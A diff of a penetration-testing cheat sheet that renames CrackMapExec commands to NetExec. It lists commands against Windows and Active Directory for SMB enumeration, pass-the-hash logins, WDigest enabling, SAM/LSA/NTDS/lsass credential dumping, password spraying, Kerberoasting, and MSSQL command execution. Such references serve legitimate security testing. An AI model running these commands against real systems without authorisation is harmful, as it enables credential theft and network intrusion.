@@ -1,296 +1,296 @@
-# cme
+# netexec
 
-% cme, crackmapexec, windows, Active directory
+% netexec, crackmapexec, windows, Active directory
 
-## cme - enumerate hosts, network
+## netexec - enumerate hosts, network
 #plateform/linux #target/remote #port/445 #protocol/smb #cat/RECON
-Example : cme smb 192.168.1.0/24
+Example : netexec smb 192.168.1.0/24
 
 https://mpgn.gitbook.io/crackmapexec/
 
 ```bash
-cme smb <ip>
+netexec smb <ip>
 ```
 
-## cme - enumerate password policy
+## netexec - enumerate password policy
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
 
 ```bash
-cme smb <ip> -u <user> -p '<password>' --pass-pol
+netexec smb <ip> -u <user> -p '<password>' --pass-pol
 ```
 
-## cme - enumerate null session
+## netexec - enumerate null session
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT
 
 ```bash
-cme smb <ip> -u '' -p ''
+netexec smb <ip> -u '' -p ''
 ```
 
-## cme - enumerate anonymous login
+## netexec - enumerate anonymous login
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT
 
 ```bash
-cme smb <ip> -u 'a' -p ''
+netexec smb <ip> -u 'a' -p ''
 ```
 
-## cme - enumerate active sessions
+## netexec - enumerate active sessions
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 
 
 ```bash
-cme smb <ip> -u <user> -p '<password>' --sessions
+netexec smb <ip> -u <user> -p '<password>' --sessions
 ```
 
-## cme - enumerate domain users
+## netexec - enumerate domain users
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 
 
 ```bash
-cme smb <ip> -u <user> -p '<password>' --users
+netexec smb <ip> -u <user> -p '<password>' --users
 ```
 
-## cme - enumerate users by bruteforce the RID
+## netexec - enumerate users by bruteforce the RID
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 
 
 ```bash
-cme smb <ip> -u <user> -p '<password>' --rid-brute
+netexec smb <ip> -u <user> -p '<password>' --rid-brute
 ```
 
-## cme - enumerate domain groups
+## netexec - enumerate domain groups
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 
 
 ```bash
-cme smb <ip> -u <user> -p '<password>' --groups
+netexec smb <ip> -u <user> -p '<password>' --groups
 ```
 
-## cme - enumerate local groups
+## netexec - enumerate local groups
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 
 
 ```bash
-cme smb <ip> -u <user> -p '<password>' --local-groups
+netexec smb <ip> -u <user> -p '<password>' --local-groups
 ```
 
-## cme - enumerate shares
+## netexec - enumerate shares
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 
 
 Enumerate permissions on all shares
 
 ```bash
-cme smb <ip> -u <user> -p <password> -d <domain> --shares
+netexec smb <ip> -u <user> -p <password> -d <domain> --shares
 ```
 
-## cme - enumerate disks
+## netexec - enumerate disks
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 
 
 Enumerate disks on the remote target
 
 ```bash
-cme smb <ip> -u <user> -p '<password>' --disks
+netexec smb <ip> -u <user> -p '<password>' --disks
 ```
 
-## cme - enumerate smb target not signed
+## netexec - enumerate smb target not signed
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON
 
 Maps the network of live hosts and saves a list of only the hosts that  don't require SMB signing. List format is one IP per line
 
 ```bash
-cme smb <ip> --gen-relay-list smb_targets.txt
+netexec smb <ip> --gen-relay-list smb_targets.txt
 ```
 
-## cme - enumerate logged users
+## netexec - enumerate logged users
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/RECON 
 
 ```bash
-cme smb <ip> -u <user> -p '<password>' --loggedon-users
+netexec smb <ip> -u <user> -p '<password>' --loggedon-users
 ```
 
-## cme - enable wdigest
+## netexec - enable wdigest
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT  #warning/modify_target 
 
 enable/disable the WDigest provider and dump clear-text credentials from LSA memory.
 
 ```bash
-cme smb <ip> -u <user|Administrator> -p '<password>' --local-auth --wdigest enable
+netexec smb <ip> -u <user|Administrator> -p '<password>' --local-auth --wdigest enable
 ```
 
-## cme - loggout user
+## netexec - loggout user
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #warning/modify_target #cat/POSTEXPLOIT
 
 Can be useful after enable wdigest to force user to reconnect
 
 ```bash
-cme smb <ip> -u <user> -p '<password>' -x 'quser'
-cme smb <ip> -u <user> -p '<password>' -x 'logoff <id_user>' --no-output
+netexec smb <ip> -u <user> -p '<password>' -x 'quser'
+netexec smb <ip> -u <user> -p '<password>' -x 'logoff <id_user>' --no-output
 ```
 
-## cme - local-auth
+## netexec - local-auth
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT  
 
 ```bash
-cme smb <ip> -u <user> -p <password> --local-auth
+netexec smb <ip> -u <user> -p <password> --local-auth
 ```
 
-## cme - local-auth with hash
+## netexec - local-auth with hash
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT 
 
 ```bash
-cme smb <ip> -u <user> -H <hash> --local-auth
+netexec smb <ip> -u <user> -H <hash> --local-auth
 ```
 
-## cme - domain auth
+## netexec - domain auth
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT  
 
 ```bash
-cme smb <ip> -u <user> -p <password> -d <domain>
+netexec smb <ip> -u <user> -p <password> -d <domain>
 ```
 
-## cme - kerberos auth
+## netexec - kerberos auth
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/CONNECT 
 
 Previously import ticket : 
 export KRB5CCNAME=/tmp/ticket.ccache
 
 ```bash
-cme smb <ip> --kerberos
+netexec smb <ip> --kerberos
 ```
 
-## cme - Dump SAM
+## netexec - Dump SAM
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER
 
 Dump SAM hashes using methods from secretsdump.py
 You need at least local admin privilege on the remote target, use option --local-auth if your user is a local account
 
 ```bash
-cme smb <ip> -u <user> -p <password> -d <domain> --sam
+netexec smb <ip> -u <user> -p <password> -d <domain> --sam
 ```
 
-## cme - Dump LSA
+## netexec - Dump LSA
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER
 
 Dump LSA secrets using methods from secretsdump.py
 Requires Domain Admin or Local Admin Privileges on target Domain Controller
 
 ```bash
-cme smb <ip> -u <user> -p <password> -d <domain> --lsa
+netexec smb <ip> -u <user> -p <password> -d <domain> --lsa
 ```
 
-## cme - dump ntds.dit
+## netexec - dump ntds.dit
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER
 
 Dump the NTDS.dit from target DC using methods from secretsdump.py
 Requires Domain Admin or Local Admin Privileges on target Domain Controller
 
 ```bash
-cme smb <ip> -u <user> -p <password> -d <domain> --ntds
+netexec smb <ip> -u <user> -p <password> -d <domain> --ntds
 ```
 
-## cme - dump lsass
+## netexec - dump lsass
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER
 
 ```bash
-cme smb <ip> -u <user> -p <password> -d <domain> -M lsassy
+netexec smb <ip> -u <user> -p <password> -d <domain> -M lsassy
 ```
 
-## cme - dump lsass - with bloodhond update
+## netexec - dump lsass - with bloodhond update
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/POSTEXPLOIT/CREDS_RECOVER
 
 ```bash
-cme smb <ip> --local-auth -u <user> -H <hash> -M lsassy -o BLOODHOUND=True NEO4JUSER=<user|neo4j> NEO4JPASS=<neo4jpass|exegol4thewin>
+netexec smb <ip> --local-auth -u <user> -H <hash> -M lsassy -o BLOODHOUND=True NEO4JUSER=<user|neo4j> NEO4JPASS=<neo4jpass|exegol4thewin>
 ```
 
-## cme - password spray (user=password)
+## netexec - password spray (user=password)
 #plateform/linux #target/remote #port/445 #port/139 #protocol/smb #cat/ATTACK/BRUTEFORCE-SPRAY 
 
 ```bash
-cme smb <dc-ip> -u <user.txt> -p <password.txt> --no-bruteforce --continue-on-success
+netexec smb <dc-ip> -u <user.txt> -p <password.txt> --no-bruteforce --continue-on-success
 ```
 
-## cme - password spray multiple test 
+## netexec - password spray multiple test 
 #plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/BRUTEFORCE-SPRAY #tag/warning
 
 (careful on lockout)
 
 ```bash
-cme smb <dc-ip> -u <user.txt> -p <password.txt> --continue-on-success
+netexec smb <dc-ip> -u <user.txt> -p <password.txt> --continue-on-success
 ```
 
-## cme - put file
+## netexec - put file
 #plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/FILE_TRANSFERT 
 Send a local file to the remote target
 
 ```bash
-cme smb <ip> -u <user> -p <password> --put-file <local_file> <remote_path|\\Windows\\Temp\\target.txt>
+netexec smb <ip> -u <user> -p <password> --put-file <local_file> <remote_path|\\Windows\\Temp\\target.txt>
 ```
 
-## cme - get file
+## netexec - get file
 #plateform/linux #target/remote #port/445 #protocol/smb #cat/ATTACK/FILE_TRANSFERT 
 Send a local file to the remote target
 
 ```bash
-cme smb <ip> -u <user> -p <password> --get-file <remote_path|\\Windows\\Temp\\target.txt> <local_file>
+netexec smb <ip> -u <user> -p <password> --get-file <remote_path|\\Windows\\Temp\\target.txt> <local_file>
 ```
 
-## cme - ASREPRoast enum without authentication
+## netexec - ASREPRoast enum without authentication
 #plateform/linux #target/remote #port/389 #port/639 #protocol/ldap #cat/RECON 
 
 User can be a wordlist too (user.txt)
 Hashcat format  -m 18200 
 
 ```bash
-cme ldap <ip> -u <user> -p '' --asreproast ASREProastables.txt --kdcHost <dc_ip>
+netexec ldap <ip> -u <user> -p '' --asreproast ASREProastables.txt --kdcHost <dc_ip>
 ```
 
-## cme - ASREPRoast enum with authentication
+## netexec - ASREPRoast enum with authentication
 #plateform/linux #target/remote #port/389 #port/639 #protocol/ldap #cat/RECON  
 
 Hashcat format  -m 18200 
 
 ```bash
-cme ldap <ip> -u <user> -p '<password>' --asreproast ASREProastables.txt --kdcHost <dc_ip>
+netexec ldap <ip> -u <user> -p '<password>' --asreproast ASREProastables.txt --kdcHost <dc_ip>
 ```
 
-## cme - Kerberoasting
+## netexec - Kerberoasting
 #plateform/linux #target/remote #port/389 #port/639 #protocol/ldap #cat/RECON 
 
 Hashcat format  -m 13100
 
 ```bash
-cme ldap <ip> -u <user> -p '<password>' --kerberoasting kerberoastables.txt --kdcHost <dc_ip>
+netexec ldap <ip> -u <user> -p '<password>' --kerberoasting kerberoastables.txt --kdcHost <dc_ip>
 ```
 
-## cme - Unconstrained delegation
+## netexec - Unconstrained delegation
 #plateform/linux #target/remote #port/389 #port/639 #protocol/ldap #cat/RECON 
 
 List of all computers et users with the flag TRUSTED_FOR_DELEGATION
 
 ```bash
-cme ldap <ip> -u <user> -p '<password>' --trusted-for-delegation
+netexec ldap <ip> -u <user> -p '<password>' --trusted-for-delegation
 ```
 
-## cme - winrm-auth
+## netexec - winrm-auth
 #plateform/linux #target/remote #port/5985 #port/5986 #protocol/winrm #cat/ATTACK/CONNECT  
 
 ```bash
-cme winrm <ip> -u <user> -p <password>
+netexec winrm <ip> -u <user> -p <password>
 ```
 
-## cme - mssql password spray
+## netexec - mssql password spray
 #plateform/linux #target/remote #port/1433 #protocol/mssql #cat/ATTACK/BRUTEFORCE-SPRAY  
 
 ```bash
-cme mssql <ip> -u <user.txt> -p <password.txt>  --no-bruteforce
+netexec mssql <ip> -u <user.txt> -p <password.txt>  --no-bruteforce
 ```
 
-## cme - mssql execute query
+## netexec - mssql execute query
 #plateform/linux #target/remote #port/1433 #protocol/mssql #cat/ATTACK/EXPLOIT 
 
 ```bash
-cme mssql <ip> -u <user> -p '<password>' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
+netexec mssql <ip> -u <user> -p '<password>' --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'
 ```
 
-## cme - mssql execute command
+## netexec - mssql execute command
 #plateform/linux #target/remote #port/1433 #protocol/mssql #cat/ATTACK/EXPLOIT 
 
 ```bash
-cme mssql <ip> -u <user> -p '<password>' --local-auth -x <cmd|whoami>
+netexec mssql <ip> -u <user> -p '<password>' --local-auth -x <cmd|whoami>
 ```
 
 = ip: 192.168.1.0/24
